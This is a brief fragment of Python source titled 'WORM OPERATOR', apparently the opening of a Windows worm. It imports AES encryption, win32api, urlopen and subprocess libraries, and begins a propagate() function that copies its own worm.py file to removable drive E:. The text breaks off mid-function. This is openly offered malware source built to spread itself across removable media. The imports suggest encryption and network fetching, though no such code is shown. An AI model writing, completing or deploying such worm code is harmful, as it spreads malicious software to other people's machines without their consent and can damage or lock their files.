#========WORM OPERATOR==========
from shutil import copyfile
import os, getpass
from sys import argv
import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil


def propagate():
    source = os.path.abspath("worm.py")
    user = getpass.getuser()

    if (os.path.isdir("E:\\")):
        destination = "E:"+ "\\worm.py"
    